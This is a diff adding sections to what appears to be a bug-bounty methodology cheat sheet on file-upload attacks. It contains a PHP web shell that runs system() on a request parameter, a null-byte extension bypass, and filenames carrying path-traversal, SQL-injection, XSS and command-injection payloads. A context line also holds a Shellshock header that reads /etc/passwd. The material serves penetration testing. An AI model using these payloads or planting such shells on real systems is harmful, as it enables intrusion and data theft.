@@ -10,6 +10,27 @@
 
 </br>
 
+**> Subject: Bypassing File uploading restrictions**
+> 1. If the application will only accept PDF, use HTML nullbyte filename extension <kbd> Example: example.html to example.html%00.pdf
+> 2. Capture post request with Burp and change the <kbd> Content-type: text/html </kbd>
+
+</br>
+
+**> Subject: RCE from file upload**
+> 1. Check File-type if JavaScript is present in profile pic and Create a hack.php file with below content and upload the file.
+```
+<?php>
+    if(isset($_REQUEST['cmd'])){
+        $cmd=($_REQUEST['cmd']);
+        system($cmd);    
+    } else {
+        echo "RCE!!!!"
+    }
+```
+> 2. Upload and replace CMD with your desired payload like sleep, timeout, etc
+
+</br>
+
 **> Subject: File Upload XSS in image uploading of App**
 > 1. Go to App settings and select a html file with .jpg extension.
 > 2. Capture upload request using Burp and change the file extension from .jpg to .html, additionaly change the content type to text/html and it will upload the file.
@@ -50,6 +71,31 @@ User-Agent: {:;}; echo $(</etc/passwd)
 
 </br>
 
+**> Subject: Other vulnerabilities**
+> 1. Set filename to ../../../tmp/lol.png and try to achieve a path traversal
+> 2. Set filename to sleep(10) — -.jpg and you may be able to achieve a SQL injection.
+> 3. Set filename to ```<svg onload=alert(document.domain)>``` to achieve a XSS
+> 4. Set filename to ; sleep 10; to test some command injection
+> 5. Uploading a file when another file with the same name already exists. This may show interesting error messages that can lead to information disclosure. Logical flaws might be found in the application renames the new file to keep it on the server.
+> 6. Upload a directory with the .asp extension, then name the script within the directory with a permitted file extension, for example, folder.asp\file.txt
+> 7. Uploading a file with a long name. This may show interesting error messages that can lead to information disclosure.
+> 8. Uploading a file multiple times at the same time. This may show interesting error messages that can lead to information disclosure.
+> 9. Uploading a “crossdomain.xml” or “clientaccesspolicy.xml” file can make a website vulnerable to cross-site content hijacking.
+> 10. Upload XML file multiple times in order to identify any possible processing on the server-side.
+> 11. Uploading files that may not be deleted easily such as “…:.jpg” in NTFS that makes the “…” file
+> 12. Upload .jsp file into web tree — JSP code executed as the web user
+> 13. Upload .gif file to be resized — image library flaw exploited
+> 14. Upload huge files — file space denial of service
+> 15. Upload file using malicious path or name — overwrite a critical file
+> 16. Upload file containing personal data — other users access it
+> 17. Upload file containing “tags” — tags get executed as part of being “included” in a web page
+> 18. Upload .rar file to be scanned by antivirus — command executed on a server running the vulnerable antivirus software
+> 19. Use different file names such has .php3,phtml, shell.p.phpp, shell.txt.jpg.png.asp, shell.txt.jpg.png.asp
+> 20. Try long file names supermassivelongfileeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeename.php
+> 21. Try to upload with huge file sizes
+
+</br>
+
 # Methodolgy: IDOR
 
 **> Subject: IDOR in the password change functionality**
@@ -67,5 +113,4 @@ Accept: application/json
 }
 ```
 > 2. Input any valid user account and input any password
-
 
